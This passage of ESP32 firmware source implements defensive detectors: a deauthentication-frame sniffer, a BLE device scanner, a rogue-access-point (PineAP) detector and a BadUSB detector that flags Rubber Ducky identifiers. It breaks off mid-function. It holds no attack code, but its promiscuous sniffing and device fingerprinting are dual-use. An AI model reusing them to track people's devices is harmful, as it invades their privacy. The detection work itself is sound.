void loop() {
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    runCurrentSetup();
  }
  runCurrentLoop();
}

///////////////////////////////
/// DEAUTH HUNTER IMPLEMENTATION ///
///////////////////////////////

DeauthStats deauth_stats;
uint8_t current_channel_idx = 0;
uint32_t last_channel_change = 0;
uint32_t scan_cycle_start = 0;
bool deauth_hunter_active = false;
std::vector<String> seen_ap_macs;
bool channel_hop_pause = false;

uint16_t getRSSIColor(float rssi, float max) {
  if(rssi < max * .5 ) return BLUE; else if(rssi < max * .8 ) return YELLOW; else return RED;
}

void extract_mac(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x",
          data[offset+0], data[offset+1], data[offset+2],
          data[offset+3], data[offset+4], data[offset+5]);
}

void add_unique_ap(const char* mac) {
  String mac_str = String(mac);
  for(auto& seen_mac : seen_ap_macs) { if(seen_mac == mac_str) return; }
  seen_ap_macs.push_back(mac_str);
  deauth_stats.unique_aps = seen_ap_macs.size();
}

void draw_rssi_bar(float rssi, float rssimax = -20) {
  DISP.print(" "); DISP.print(rssi); DISP.println("dBm");
  DISP.println("Sel: Pause/Scan\nNext: Exit");
  float rssipct = 100 + rssi; float maxpct = 100 + rssimax;
  if (rssipct > maxpct) rssipct = maxpct;
  uint16_t rssiColor=getRSSIColor(rssipct, maxpct);
  int barX = 10, barY = 120, barW = 220, barH = 10;
  DISP.drawRect(barX, barY, barW, barH, rssiColor);
  int fillW = (barW - 4) * (rssipct / maxpct);
  DISP.fillRect(barX + 2, barY + 2, fillW, barH - 4, rssiColor);
  int remainingW = (barW - 4) - fillW;
  if (remainingW > 0) DISP.fillRect(barX + 2 + fillW, barY + 2, remainingW, barH - 4, TFT_BLACK);
}

void hop_channel() {
  uint32_t now = millis();
  if(now - last_channel_change > 1000) {
    current_channel_idx = (current_channel_idx + 1) % NUM_CHANNELS;
    esp_wifi_set_channel(WIFI_CHANNELS[current_channel_idx], WIFI_SECOND_CHAN_NONE);
    last_channel_change = now;
  }
}

void reset_stats_if_needed() {
  uint32_t now = millis();
  if(now - deauth_stats.last_reset_time > 1000) {
    deauth_stats.total_deauths = 0; deauth_stats.rssi_sum = 0;
    deauth_stats.rssi_count = 0; deauth_stats.avg_rssi = -100;
    seen_ap_macs.clear(); deauth_stats.unique_aps = 0;
    deauth_stats.last_reset_time = now; scan_cycle_start = now;
  }
}

static void deauth_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!deauth_hunter_active) return;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  if (type == WIFI_PKT_MGMT) {
    uint8_t frame_type = snifferPacket->payload[0];
    if (frame_type == 0xC0 || frame_type == 0xA0) {
      deauth_stats.total_deauths++;
      char source_mac[18];
      extract_mac(source_mac, snifferPacket->payload, 10);
      add_unique_ap(source_mac);
      float rssi = snifferPacket->rx_ctrl.rssi;
      if(deauth_stats.rssi_count == 0) {
        deauth_stats.avg_rssi = rssi; deauth_stats.rssi_count = 1; deauth_stats.rssi_sum = rssi;
      } else {
        deauth_stats.rssi_count++; deauth_stats.rssi_sum += rssi;
        deauth_stats.avg_rssi = rssi;
        if(deauth_stats.rssi_count > 1000) {
          deauth_stats.rssi_sum = deauth_stats.avg_rssi; deauth_stats.rssi_count = 1;
        }
      }
    }
  }
}

void start_deauth_monitoring() {
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(100);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer_callback);
  esp_wifi_set_channel(WIFI_CHANNELS[current_channel_idx], WIFI_SECOND_CHAN_NONE);
  deauth_hunter_active = true;
  scan_cycle_start = millis(); deauth_stats.last_reset_time = scan_cycle_start;
}

void stop_deauth_monitoring() {
  esp_wifi_set_promiscuous(false);
  deauth_hunter_active = false;
  WiFi.mode(WIFI_MODE_STA);
}

void deauth_hunter_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setCursor(0, 0);
  memset(&deauth_stats, 0, sizeof(DeauthStats)); deauth_stats.avg_rssi = -90;
  seen_ap_macs.clear(); current_channel_idx = 0; channel_hop_pause = false;
  start_deauth_monitoring(); delay(500);
}

void deauth_hunter_loop() {
  if (check_next_press()) { stop_deauth_monitoring(); isSwitching = true; current_proc = 12; return; }
  if (check_select_press()) { channel_hop_pause = !channel_hop_pause; delay(500); }
  if (!channel_hop_pause) hop_channel();
  reset_stats_if_needed();
  DISP.setCursor(0, 0); DISP.setTextSize(MEDIUM_TEXT); DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setCursor(0, 0); DISP.println("Deauth Hunter");
  DISP.setTextSize(SMALL_TEXT); DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf("Ch: "); DISP.printf("%-2d", WIFI_CHANNELS[current_channel_idx]);
  DISP.print(" APs: "); DISP.printf("%-2d\n", deauth_stats.unique_aps);
  DISP.printf("Pkts: %-5d / %d\n", deauth_stats.total_deauths, dh_pkts);
  if (dh_pkts && !channel_hop_pause && deauth_stats.total_deauths > dh_pkts) play_alert_beep();
  DISP.print("RSSI:"); draw_rssi_bar(deauth_stats.avg_rssi, dh_max_rssi);
  delay(100);
}

///////////////////////////////
/// BLE HUNTER IMPLEMENTATION ///
///////////////////////////////

BLEStats ble_stats;
BLEScan* ble_scanner = nullptr;
bool ble_hunter_active = false;
bool ble_channel_hop_pause = false;
std::vector<BLEDeviceInfo> seen_ble_devices;

void BLEHunterCallback::onResult(BLEAdvertisedDevice advertisedDevice) {
  if (!ble_hunter_active) return;
  static uint32_t last_process = 0; uint32_t now = millis();
  if (now - last_process < 50) return;
  last_process = now;
  String mac = advertisedDevice.getAddress().toString().c_str();
  String name = advertisedDevice.getName().c_str();
  int32_t rssi = advertisedDevice.getRSSI();
  ble_stats.total_devices++; ble_stats.rssi_sum += rssi;
  ble_stats.rssi_count++; ble_stats.avg_rssi = rssi;
  add_unique_ble_device(mac, name, rssi);
}

void add_unique_ble_device(const String& mac, const String& name, int32_t rssi) {
  for (auto& device : seen_ble_devices) {
    if (device.mac == mac) { device.rssi = rssi; device.last_seen = millis(); return; }
  }
  if (seen_ble_devices.size() >= MAX_BLE_DEVICES) return;
  BLEDeviceInfo newDevice;
  newDevice.mac = mac;
  newDevice.name = name.length() > 0 ? name : "Unknown";
  newDevice.rssi = rssi; newDevice.last_seen = millis();
  newDevice.device_type = detect_device_type(mac, name);
  seen_ble_devices.push_back(newDevice);
  ble_stats.unique_devices = seen_ble_devices.size();
}

String detect_device_type(const String& mac, const String& name) {
  if (name.indexOf("AirPods") != -1 || name.indexOf("iPhone") != -1 ||
      name.indexOf("iPad") != -1 || name.indexOf("Apple") != -1) return "Apple";
  if (name.indexOf("Android") != -1 || name.indexOf("Galaxy") != -1 ||
      name.indexOf("Pixel") != -1) return "Android";
  String macPrefix = mac.substring(0, 8); macPrefix.toUpperCase();
  if (macPrefix.startsWith("FC:58:FA") || macPrefix.startsWith("3C:7C:3F")) return "Apple";
  return "Unknown";
}

void start_ble_monitoring() {
  if (ble_hunter_active) return;
  BLEDevice::init("");
  ble_scanner = BLEDevice::getScan();
  ble_scanner->setAdvertisedDeviceCallbacks(new BLEHunterCallback());
  ble_scanner->setActiveScan(true);
  ble_scanner->setInterval(BLE_SCAN_INTERVAL);
  ble_scanner->setWindow(BLE_SCAN_WINDOW);
  ble_hunter_active = true;
}

void stop_ble_monitoring() {
  if (!ble_hunter_active) return;
  if (ble_scanner) { ble_scanner->stop(); ble_scanner->clearResults(); }
  BLEDevice::deinit(); ble_hunter_active = false;
}

void reset_ble_stats_if_needed() {
  uint32_t now = millis();
  if (now - ble_stats.last_reset_time > 10000) {
    ble_stats.total_devices = 0; ble_stats.rssi_sum = 0; ble_stats.rssi_count = 0;
    ble_stats.avg_rssi = -70; ble_stats.last_reset_time = now;
    seen_ble_devices.erase(
      std::remove_if(seen_ble_devices.begin(), seen_ble_devices.end(),
        [now](const BLEDeviceInfo& device) { return (now - device.last_seen) > 15000; }),
      seen_ble_devices.end());
    while (seen_ble_devices.size() > MAX_BLE_DEVICES) seen_ble_devices.erase(seen_ble_devices.begin());
    ble_stats.unique_devices = seen_ble_devices.size();
  }
}

void ble_hunter_setup() {
  ble_stats = BLEStats(); seen_ble_devices.clear(); ble_channel_hop_pause = false;
  ble_stats.last_reset_time = millis();
  DISP.setCursor(0, 0); DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.println(" BLE Hunter  ");
  DISP.setTextSize(SMALL_TEXT); DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println("Initializing..."); start_ble_monitoring();
}

void ble_hunter_loop() {
  if (check_next_press()) { stop_ble_monitoring(); isSwitching = true; current_proc = 16; return; }
  if (check_select_press()) { ble_channel_hop_pause = !ble_channel_hop_pause; delay(500); }
  static uint32_t last_scan = 0; uint32_t now = millis();
  if (ble_scanner && (now - last_scan > 1000)) { ble_scanner->start(BLE_SCAN_TIME, false); last_scan = now; }
  reset_ble_stats_if_needed();
  delay(100);
  DISP.setCursor(0, 0); DISP.setTextSize(MEDIUM_TEXT); DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(" BLE Hunter  ");
  DISP.setTextSize(SMALL_TEXT); DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf("Devices: %-6d\n", ble_stats.unique_devices);
  DISP.printf("Pkts: %-5d / %3d\n", ble_stats.total_devices, bh_pkts);
  if (bh_pkts && !ble_channel_hop_pause && ble_stats.total_devices > bh_pkts) play_alert_beep();
  if (ble_stats.rssi_count > 0) { DISP.print("RSSI:"); draw_rssi_bar(ble_stats.avg_rssi, bh_max_rssi); }
}

void ble_hunter_cleanup() { stop_ble_monitoring(); seen_ble_devices.clear(); }

///////////////////////////////
/// PINEAP HUNTER IMPLEMENTATION ///
///////////////////////////////

PineAPHunterStats pineap_hunter_stats;
bool pineap_hunter_active = false;
uint32_t last_beep_time = 0;

void pineap_hunter_setup() {
  pineap_hunter_active = true; pineap_hunter_stats = PineAPHunterStats();
  pineap_hunter_stats.scan_cycle_start = millis(); pineap_hunter_stats.view_mode = 0; cursor = 0;
  DISP.fillScreen(BGCOLOR); DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 0); DISP.println(TXT_PINEAP_HUNTER);
  DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(SMALL_TEXT);
  rstOverride = true; delay(500);
}

void pineap_hunter_loop() {
  switch (pineap_hunter_stats.view_mode) {
    case 0: handle_main_list_input(); break;
    case 1: handle_bssid_details_input(); break;
    case 2: handle_ssid_list_input(); break;
  }
  if (pineap_hunter_active) {
    scan_and_analyze(); update_pineapple_list();
    static uint32_t last_display_update = 0;
    if (pineap_hunter_stats.list_changed || (millis() - last_display_update > 1000)) {
      update_display(); last_display_update = millis();
      pineap_hunter_stats.list_changed = false;
    }
  }
}

void handle_main_list_input() {
  if (!pineap_hunter_stats.detected_pineaps.empty() && (millis() - last_beep_time > 5000)) {
    play_alert_beep(); last_beep_time = millis();
  }
  if (check_next_press()) {
    int total_items = pineap_hunter_stats.detected_pineaps.size() + 1;
    cursor++;
    if (cursor < 0) cursor = total_items - 1; else cursor %= total_items;
    update_display(); delay(250);
  }
  if (check_select_press()) {
    if (cursor >= pineap_hunter_stats.detected_pineaps.size()) {
      pineap_hunter_cleanup(); isSwitching = true; current_proc = 12;
    } else if (!pineap_hunter_stats.detected_pineaps.empty()) {
      pineap_hunter_stats.selected_bssid_index = cursor;
      pineap_hunter_stats.view_mode = 2; cursor = 0; update_display();
    }
    delay(250);
  }
}

void handle_bssid_details_input() {
  if (check_next_press() || check_select_press()) {
    pineap_hunter_stats.view_mode = 2; cursor = 0; update_display(); delay(250);
  }
}

void handle_ssid_list_input() {
  if (check_next_press()) {
    if (pineap_hunter_stats.selected_bssid_index < pineap_hunter_stats.detected_pineaps.size()) {
      const auto& pine = pineap_hunter_stats.detected_pineaps[pineap_hunter_stats.selected_bssid_index];
      int total_items = pine.essids.size() + 1;
      cursor++;
      if (cursor < 0) cursor = total_items - 1; else cursor %= total_items;
    }
    update_display(); delay(250);
  }
  if (check_select_press()) {
    pineap_hunter_stats.view_mode = 0;
    cursor = pineap_hunter_stats.selected_bssid_index;
    update_display(); delay(250);
  }
}

void scan_and_analyze() {
  static uint32_t last_wifi_scan = 0;
  if (millis() - last_wifi_scan > 2000) {
    int n = WiFi.scanNetworks();
    if (n > 0) {
      for (int i = 0; i < n; i++) {
        String bssid_str = WiFi.BSSIDstr(i);
        String essid = WiFi.SSID(i);
        int32_t rssi = WiFi.RSSI(i);
        if (essid.length() > 0 && bssid_str.length() > 0) add_scan_result(bssid_str, essid, rssi);
      }
      pineap_hunter_stats.total_scans++;
      process_scan_results(); maintain_buffer_size();
    }
    WiFi.scanDelete(); last_wifi_scan = millis();
  }
}

void add_scan_result(const String& bssid_str, const String& essid, int32_t rssi) {
  if (pineap_hunter_stats.scan_buffer.find(bssid_str) == pineap_hunter_stats.scan_buffer.end()) {
    pineap_hunter_stats.scan_buffer[bssid_str] = std::vector<SSIDRecord>();
  }
  auto& essid_list = pineap_hunter_stats.scan_buffer[bssid_str];
  bool found = false;
  for (auto& existing_record : essid_list) {
    if (existing_record.essid == essid) {
      existing_record.rssi = rssi; existing_record.last_seen = millis(); found = true; break;
    }
  }
  if (!found) essid_list.push_back(SSIDRecord(essid, rssi));
}

void process_scan_results() {
  std::vector<PineRecord> new_pineaps;
  for (const auto& entry : pineap_hunter_stats.scan_buffer) {
    const String& bssid_str = entry.first;
    const std::vector<SSIDRecord>& ssid_records = entry.second;
    if (ssid_records.size() >= ph_alert_ssids) {
      PineRecord pine;
      string_to_bssid(bssid_str, pine.bssid);
      pine.essids = ssid_records; pine.last_seen = millis();
      std::sort(pine.essids.begin(), pine.essids.end(),
        [](const SSIDRecord& a, const SSIDRecord& b) { return a.last_seen > b.last_seen; });
      new_pineaps.push_back(pine);
    }
  }
  if (new_pineaps.size() != pineap_hunter_stats.detected_pineaps.size()) {
    pineap_hunter_stats.list_changed = true;
  } else {
    for (size_t i = 0; i < new_pineaps.size(); i++) {
      const auto& old_pine = pineap_hunter_stats.detected_pineaps[i];
      const auto& new_pine = new_pineaps[i];
      if (memcmp(old_pine.bssid, new_pine.bssid, 6) != 0 ||
          old_pine.essids.size() != new_pine.essids.size()) {
        pineap_hunter_stats.list_changed = true; break;
      }
    }
  }
  pineap_hunter_stats.detected_pineaps = new_pineaps;
}

void maintain_buffer_size() {
  if (pineap_hunter_stats.scan_buffer.size() > 50) {
    auto it = pineap_hunter_stats.scan_buffer.begin();
    std::advance(it, pineap_hunter_stats.scan_buffer.size() - 50);
    pineap_hunter_stats.scan_buffer.erase(pineap_hunter_stats.scan_buffer.begin(), it);
  }
}

bool is_pineapple_detected(const std::vector<String>& essids) { return essids.size() >= ph_alert_ssids; }
void update_pineapple_list() { process_scan_results(); }

void update_display() {
  switch (pineap_hunter_stats.view_mode) {
    case 0: draw_main_list(); break;
    case 1: draw_bssid_details(); break;
    case 2: draw_ssid_list(); break;
  }
}

void draw_main_list() {
  DISP.fillScreen(BGCOLOR);
  int total_pineaps = pineap_hunter_stats.detected_pineaps.size();
  DISP.setCursor(0, 0); DISP.setTextSize(MEDIUM_TEXT); DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(TXT_PINEAP_HUNTER); DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(SMALL_TEXT);
  if (total_pineaps == 0) DISP.println("No PineAPs detected");
  else {
    if (cursor > 4) {
      for (int i = cursor - 4; i < total_pineaps && i < cursor + 5; i++) {
        if (cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
        const auto& pine = pineap_hunter_stats.detected_pineaps[i];
        String bssid_str = bssid_to_string(pine.bssid);
        DISP.printf("%s %d", bssid_str.c_str(), pine.essids.size()); DISP.println();
        DISP.setTextColor(FGCOLOR, BGCOLOR);
      }
    } else {
      for (int i = 0; i < total_pineaps && i < 8; i++) {
        if (cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
        const auto& pine = pineap_hunter_stats.detected_pineaps[i];
        String bssid_str = bssid_to_string(pine.bssid);
        DISP.printf("%s %d", bssid_str.c_str(), pine.essids.size()); DISP.println();
        DISP.setTextColor(FGCOLOR, BGCOLOR);
      }
    }
  }
  if (cursor >= total_pineaps) DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(TXT_BACK); DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void draw_bssid_details() { draw_ssid_list(); }

void draw_ssid_list() {
  if (pineap_hunter_stats.selected_bssid_index >= pineap_hunter_stats.detected_pineaps.size()) {
    draw_main_list(); return;
  }
  const auto& pine = pineap_hunter_stats.detected_pineaps[pineap_hunter_stats.selected_bssid_index];
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(SMALL_TEXT); DISP.setCursor(0, 0);
  int total_ssids = pine.essids.size();
  String bssid_str = bssid_to_string(pine.bssid);
  DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.println(bssid_str); DISP.setTextColor(FGCOLOR, BGCOLOR);
  if (cursor > 4) {
    for (int i = cursor - 4; i < total_ssids && i < cursor + 5; i++) {
      if (cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf("[%d] %s\n", pine.essids[i].rssi, pine.essids[i].essid.substring(0, 14).c_str());
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (int i = 0; i < total_ssids && i < 7; i++) {
      if (cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.printf("[%d] %s\n", pine.essids[i].rssi, pine.essids[i].essid.substring(0, 14).c_str());
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
  if (cursor >= total_ssids) DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(TXT_BACK); DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void pineap_hunter_cleanup() {
  pineap_hunter_active = false;
  pineap_hunter_stats.scan_buffer.clear();
  pineap_hunter_stats.detected_pineaps.clear();
  rstOverride = false;
}

String bssid_to_string(const uint8_t* bssid) {
  char bssid_str[18];
  sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x",
          bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(bssid_str);
}

void string_to_bssid(const String& bssid_str, uint8_t* bssid) {
  sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
}

void play_alert_beep() {
    #if defined(CARDPUTER) || defined(STICK_C_PLUS2) || defined(STICKS3)
      SPEAKER.tone(4000, 50);
    #endif
}

///////////////////////////////
/// HUNTER SETTINGS ///
///////////////////////////////

int bh_rssi_threshold = -40;
int dh_rssi_threshold = -20;
int bh_alert_pkts = 10;
int dh_alert_pkts = 10;

void bh_rssi_setup() {
  DISP.setCursor(0, 0); DISP.println("BH RSSI Threshold");
  #if defined(USE_EEPROM)
    int stored_value = -(int8_t)EEPROM.read(6);
    if(stored_value >= -100 && stored_value <= -10 && stored_value % 5 == 0) bh_rssi_threshold = stored_value;
  #endif
  cursor = (bh_rssi_threshold + 100) / 5;
  rstOverride = true; delay(500); DISP.fillScreen(BGCOLOR);
}

void bh_rssi_loop() {
  DISP.setCursor(0, 0); DISP.println("BH RSSI Threshold");
  DISP.printf("Current: %d dBm\n", bh_rssi_threshold); DISP.println("Range: -10 to -100");
  if (check_next_press()) {
    cursor++; cursor = cursor % 19;
    bh_rssi_threshold = -100 + (cursor * 5);
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
    DISP.printf("BH RSSI: %d dBm", bh_rssi_threshold); delay(250); DISP.fillScreen(BGCOLOR);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(6, abs(bh_rssi_threshold)); EEPROM.commit();
      bh_max_rssi = bh_rssi_threshold;
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2; delay(250);
  }
}

void dh_rssi_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.println("DH RSSI Threshold"); delay(500);
  #if defined(USE_EEPROM)
    int stored_value = -(int8_t)EEPROM.read(8);
    if(stored_value >= -100 && stored_value <= -10 && stored_value % 5 == 0) dh_rssi_threshold = stored_value;
  #endif
  cursor = (dh_rssi_threshold + 100) / 5; rstOverride = true;
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.printf("DH RSSI: %d dBm\n", dh_rssi_threshold); delay(500);
}

void dh_rssi_loop() {
  DISP.setCursor(0, 0); DISP.println("DH RSSI Threshold");
  DISP.printf("Current: %d dBm\n", dh_rssi_threshold); DISP.println("Range: -10 to -100");
  if (check_next_press()) { cursor++; cursor = cursor % 19; dh_rssi_threshold = -100 + (cursor * 5); delay(250); }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(8, abs(dh_rssi_threshold)); EEPROM.commit();
      dh_max_rssi = dh_rssi_threshold;
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2; delay(250);
  }
}

void bh_alert_pkts_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.println("BH Alert Packets"); delay(500);
  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(7);
    if(stored_value <= 100) bh_alert_pkts = stored_value;
  #endif
  cursor = bh_alert_pkts; rstOverride = true;
}

void bh_alert_pkts_loop() {
  DISP.setCursor(0, 0); DISP.println("BH Alert Packets");
  DISP.printf("Current: %3d\n", bh_alert_pkts); DISP.println("Range: 0-100");
  if (check_next_press()) {
    cursor++; cursor = cursor % 101;
    if (cursor < 0) cursor = 99;
    bh_alert_pkts = cursor; delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(7, bh_alert_pkts); EEPROM.commit();
      bh_pkts=bh_alert_pkts;
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2; delay(250);
  }
}

void dh_alert_pkts_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.println("DH Alert Packets"); delay(500);
  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(9);
    if(stored_value <= 100) dh_alert_pkts = stored_value;
  #endif
  cursor = dh_alert_pkts; rstOverride = true;
}

void dh_alert_pkts_loop() {
  DISP.setCursor(0, 0); DISP.println("DH Alert Packets");
  DISP.printf("Current: %3d\n", dh_alert_pkts); DISP.println("Range: 0-100");
  if (check_next_press()) {
    cursor++; cursor = cursor % 101;
    if (cursor < 0) cursor = 99;
    dh_alert_pkts = cursor; delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(9, dh_alert_pkts); EEPROM.commit();
      dh_pkts=dh_alert_pkts;
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2; delay(250);
  }
}

void ph_alert_ssids_setup() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.println(TXT_PH_ALERT_SSIDS); delay(500);
  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(10);
    if(stored_value >= 2 && stored_value <= 100) ph_alert_ssids = stored_value;
  #endif
  cursor = ph_alert_ssids; rstOverride = true; delay(500);
}

void ph_alert_ssids_loop() {
  DISP.setCursor(0, 0); DISP.println(TXT_PH_ALERT_SSIDS);
  DISP.printf("Current: %3d\n", ph_alert_ssids); DISP.println("Range: 2-100");
  if (check_next_press()) {
    cursor++;
    if (cursor > 100) cursor = 2;
    ph_alert_ssids = cursor; delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(10, ph_alert_ssids); EEPROM.commit();
    #endif
    rstOverride = false; isSwitching = true; current_proc = 2; delay(250);
  }
}

///////////////////////////////
/// BADUSB HUNTER (Cardputer) ///
///////////////////////////////

#if defined(CARDPUTER)

static USBDeviceInfo badusb_currentDevice;
static bool badusb_deviceConnected = false;
static bool badusb_deviceWasConnected = false;
static unsigned long badusb_lastBlinkTime = 0;
static bool badusb_ledState = false;
static usb_host_client_handle_t badusb_client_hdl = nullptr;
static CRGB badusb_leds[BADUSB_NUM_LEDS];

const char* badusb_getUSBClassName(uint8_t classCode) {
  switch(classCode) {
    case 0x00: return "Device"; case 0x01: return "Audio"; case 0x02: return "CDC-Comm";
    case 0x03: return "HID"; case 0x05: return "Physical"; case 0x06: return "Image";
    case 0x07: return "Printer"; case 0x08: return "Mass Storage"; case 0x09: return "Hub";
    case 0x0A: return "CDC-Data"; case 0x0B: return "Smart Card"; case 0x0D: return "Security";
    case 0x0E: return "Video"; case 0x0F: return "Healthcare"; case 0x10: return "AV";
    case 0x11: return "Billboard"; case 0xDC: return "Diagnostic"; case 0xE0: return "Wireless";
    case 0xEF: return "Misc"; case 0xFE: return "App-Specific"; case 0xFF: return "Vendor-Spec";
    default: return "Unknown";
  }
}

void badusb_analyzeDevice(USBDeviceInfo* device) {
  device->isSuspicious = false; device->suspicionReason = "";
  int hidCount = 0;
  for (int i = 0; i < device->numInterfaces; i++) if (device->interfaceClasses[i] == 0x03) hidCount++;
  if (device->numInterfaces > 1 && hidCount > 0) { device->isSuspicious = true; device->suspicionReason = "Multi-interface+HID"; }
  if (hidCount > 1) { device->isSuspicious = true; device->suspicionReason = "Multiple HID ifaces"; }
  if (device->vid == 0x03EB && device->pid == 0x2403) { device->isSuspicious = true; device->suspicionReason = "Hak5 Rubber Ducky"; }
  if (device->numInterfaces == hidCount && hidCount > 0) { device->suspicionReason = "HID"; device->isSuspicious = false; }
}

void badusb_displayWelcome() {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.println("BadUSB Hunter");
  DISP.setTextSize(SMALL_TEXT); DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println("Insert USB device"); DISP.println("");
  DISP.setTextSize(TINY_TEXT); DISP.println("USB Host ready"); DISP.println("Next: Exit");
}

void badusb_displayDeviceInfo(USBDeviceInfo* device) {
  DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0); DISP.setTextSize(SMALL_TEXT);
  if (device->isSuspicious) { DISP.setTextColor(TFT_RED); DISP.println("!SUSPICIOUS!"); play_alert_beep(); }
  else if (device->suspicionReason=="HID") { DISP.setTextColor(TFT_YELLOW); DISP.println("HID-Only Device"); play_alert_beep(); }
  else { DISP.setTextColor(TFT_GREEN); DISP.println("Device OK"); }
  DISP.setTextSize(TINY_TEXT); DISP.setTextColor(TFT_YELLOW);
  DISP.print("VID:PID "); DISP.setTextColor(TFT_WHITE);
  char vidpid[16]; sprintf(vidpid, "%04X:%04X", device->vid, device->pid); DISP.println(vidpid);
  DISP.setTextColor(TFT_CYAN); DISP.print("Class: "); DISP.setTextColor(TFT_WHITE);
  DISP.println(badusb_getUSBClassName(device->deviceClass));
  DISP.setTextColor(TFT_CYAN); DISP.print("Interfaces: "); DISP.setTextColor(TFT_WHITE);
  DISP.println(device->numInterfaces);
  for (int i = 0; i < device->numInterfaces && i < 8; i++) {
    DISP.setTextColor(TFT_WHITE); DISP.print("  "); DISP.print(i); DISP.print(": ");
    DISP.println(badusb_getUSBClassName(device->interfaceClasses[i]));
  }
  if (device->isSuspicious) { DISP.setTextSize(SMALL_TEXT); DISP.println(""); DISP.setTextColor(TFT_RED); DISP.println(device->suspicionReason); }
  DISP.println(""); DISP.setTextSize(TINY_TEXT); DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.println("Next: Exit");
}

void badusb_updateLED() {
  if (!badusb_deviceConnected) {
    if (badusb_leds[0] != CRGB::Black) { badusb_leds[0] = CRGB::Black; FastLED.show(); }
    badusb_ledState = false;
  } else {
    bool isHID = false;
    for (int i = 0; i < badusb_currentDevice.numInterfaces; i++) {
      if (badusb_currentDevice.interfaceClasses[i] == 0x03) { isHID = true; break; }
    }
    if (isHID) {
      unsigned long now = millis();
      if (now - badusb_lastBlinkTime >= 250) {
        badusb_ledState = !badusb_ledState;
        badusb_leds[0] = badusb_ledState ? CRGB::Red : CRGB::Black;
        FastLED.show(); badusb_lastBlinkTime = now;
      }
    } else {
      if (badusb_leds[0] != CRGB::Green) { badusb_leds[0] = CRGB::Green; FastLED.show(); }
      badusb_ledState = true;
    }
  }
}

void badusb_processNewDevice(uint8_t address) {
  badusb_deviceConnected = true;
  memset(&badusb_currentDevice, 0, sizeof(badusb_currentDevice));
  usb_device_handle_t dev_hdl;
  esp_err_t err = usb_host_device_open(badusb_client_hdl, address, &dev_hdl);
  if (err == ESP_OK) {
    const usb_device_desc_t *dev_desc;
    if (usb_host_get_device_descriptor(dev_hdl, &dev_desc) == ESP_OK) {
      badusb_currentDevice.vid = dev_desc->idVendor;
      badusb_currentDevice.pid = dev_desc->idProduct;
      badusb_currentDevice.deviceClass = dev_desc->bDeviceClass;
      badusb_currentDevice.numInterfaces = 0;
      const usb_config_desc_t *config_desc;
